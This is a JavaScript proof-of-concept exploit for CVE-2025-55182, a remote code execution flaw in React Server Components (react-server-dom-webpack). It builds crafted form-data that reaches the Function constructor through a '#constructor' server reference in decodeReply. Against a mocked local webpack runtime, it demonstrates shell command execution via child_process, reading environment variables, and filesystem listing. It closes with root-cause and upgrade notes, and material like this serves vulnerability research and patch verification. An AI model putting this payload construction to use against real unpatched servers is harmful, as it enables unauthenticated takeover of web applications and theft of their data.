/**
 * CVE-2025-55182 - React Server Components RCE PoC
 *
 * Demonstrates the vulnerability in react-server-dom-webpack@19.0.0
 * via the decodeReply function.
 *
 * VULNERABILITY: requireModule() in the library does not use hasOwnProperty
 * check, allowing access to prototype chain properties like "constructor".
 *
 * EXPLOITATION:
 * 1. Find any function-exporting module in the server manifest
 * 2. Access its "constructor" property via #constructor suffix
 * 3. This returns the Function constructor
 * 4. Use $F reference with controlled bound args to execute arbitrary code
 *
 * AFFECTED: react-server-dom-webpack@19.0.0, 19.1.0, 19.1.1, 19.2.0
 * FIXED: 19.0.1, 19.1.2, 19.2.1
 *
 * @see https://vercel.com/changelog/cve-2025-55182
 * @see https://www.tenable.com/blog/react2shell-cve-2025-55182
 */

'use strict';

// ============================================================
// Webpack Mock Setup (simulates webpack runtime)
// ============================================================

let webpackModuleIdx = 0;
const webpackServerModules = {};
const webpackServerMap = {};

global.__webpack_chunk_load__ = function(id) {
  return Promise.resolve();
};

global.__webpack_require__ = function(id) {
  if (webpackServerModules[id]) {
    return webpackServerModules[id];
  }
  throw new Error(`Module not found: ${id}`);
};

// ============================================================
// Register a FUNCTION-EXPORTING module (realistic scenario)
//
// Key insight: Many real apps export functions directly:
// - Next.js server actions: export default async function action() {}
// - Utility modules: module.exports = function util() {}
// - Route handlers: export async function GET() {}
//
// When a module exports a function, moduleExports.constructor === Function!
// ============================================================

const funcModuleIdx = '' + webpackModuleIdx++;
webpackServerModules[funcModuleIdx] = async function serverAction(data) {
  // A legitimate server action - could be any function export
  return { success: true, data };
};

const modulePath = 'file:///' + funcModuleIdx;

// Register with normal exports
webpackServerMap[modulePath] = {
  id: funcModuleIdx,
  chunks: [],
  name: '*'
};

// The vulnerability: #constructor accesses prototype chain!
webpackServerMap[modulePath + '#constructor'] = {
  id: funcModuleIdx,
  chunks: [],
  name: 'constructor'  // moduleExports["constructor"] = Function
};

// ============================================================
// Load vulnerable library
// ============================================================

process.env.NODE_ENV = 'production';

// Mock React internals
require.cache[require.resolve('react')] = {
  id: require.resolve('react'),
  filename: require.resolve('react'),
  loaded: true,
  exports: {
    __SERVER_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE: { H: null, A: null },
    version: '19.0.0',
  }
};

const { decodeReply } = require('react-server-dom-webpack/server.node');

// ============================================================
// EXPLOIT FUNCTION
// ============================================================

/**
 * Exploits CVE-2025-55182 to achieve RCE via decodeReply
 *
 * @param {string} code - JavaScript code to execute
 * @returns {Promise<any>} - Result of code execution
 */
async function exploit(code) {
  const formData = new Map();

  // Chunk 1: Server reference pointing to Function via #constructor
  const chunk1 = JSON.stringify({
    id: modulePath + '#constructor',  // Gets Function constructor
    bound: '$@2'                       // References chunk 2 for args
  });
  formData.set('1', chunk1);

  // Chunk 2: The code to execute (becomes Function body)
  const chunk2 = JSON.stringify([code]);
  formData.set('2', chunk2);

  // Chunk 0: $F reference to trigger loadServerReference
  formData.set('0', '"$F1"');

  // Add forEach for the library
  formData.forEach = function(callback) {
    for (const [key, value] of this.entries()) {
      callback(value, key);
    }
  };

  // decodeReply parses and returns the value
  const boundFn = await decodeReply(formData, webpackServerMap);

  // boundFn = Function.bind(null, code)
  // Calling it creates a new function with our code
  const createdFn = boundFn();

  // Execute the created function
  return createdFn();
}

// ============================================================
// DEMONSTRATION
// ============================================================

async function main() {
  console.log('='.repeat(60));
  console.log('CVE-2025-55182 - React Server Components RCE PoC');
  console.log('='.repeat(60));
  console.log('');
  console.log('Target: react-server-dom-webpack@19.0.0 (VULNERABLE)');
  console.log('');

  // Test 1: Simple code execution
  console.log('[TEST 1] Code execution - process.version');
  console.log('-'.repeat(40));
  try {
    const version = await exploit('return process.version');
    console.log('Result:', version);
    console.log('✓ RCE CONFIRMED\n');
  } catch (e) {
    console.error('Error:', e.message);
  }

  // Test 2: Environment access
  console.log('[TEST 2] Environment variable access');
  console.log('-'.repeat(40));
  try {
    const user = await exploit('return process.env.USER || process.env.USERNAME');
    console.log('Result:', user);
    console.log('✓ Environment accessible\n');
  } catch (e) {
    console.error('Error:', e.message);
  }

  // Test 3: Shell command execution
  console.log('[TEST 3] Shell command execution');
  console.log('-'.repeat(40));
  try {
    const shellCode = `
      const cp = process.mainModule.require('child_process');
      return cp.execSync('id 2>/dev/null || whoami').toString().trim();
    `;
    const output = await exploit(shellCode);
    console.log('Result:', output);
    console.log('✓ Shell access confirmed\n');
  } catch (e) {
    console.error('Error:', e.message);
  }

  // Test 4: File system access
  console.log('[TEST 4] File system access');
  console.log('-'.repeat(40));
  try {
    const fsCode = `
      const fs = process.mainModule.require('fs');
      return fs.readdirSync('/').slice(0, 5).join(', ');
    `;
    const files = await exploit(fsCode);
    console.log('Result:', files);
    console.log('✓ Filesystem accessible\n');
  } catch (e) {
    console.error('Error:', e.message);
  }

  // Summary
  console.log('='.repeat(60));
  console.log('VULNERABILITY SUMMARY');
  console.log('='.repeat(60));
  console.log('');
  console.log('Root Cause:');
  console.log('  requireModule() does: moduleExports[metadata[2]]');
  console.log('  Without hasOwnProperty check, this accesses prototype chain');
  console.log('');
  console.log('Exploitation:');
  console.log('  1. Any function-exporting module\'s constructor === Function');
  console.log('  2. Access via #constructor suffix in action ID');
  console.log('  3. $F reference triggers loadServerReference');
  console.log('  4. Controlled bound args become Function body');
  console.log('  5. Arbitrary code execution achieved');
  console.log('');
  console.log('Impact:');
  console.log('  - Unauthenticated RCE');
  console.log('  - CVSS 10.0 (Critical)');
  console.log('  - Affects default Next.js configurations');
  console.log('');
  console.log('Mitigation:');
  console.log('  - Upgrade to react-server-dom-webpack >= 19.0.1');
  console.log('  - Upgrade Next.js to patched versions');
  console.log('');
}

main().catch(console.error);
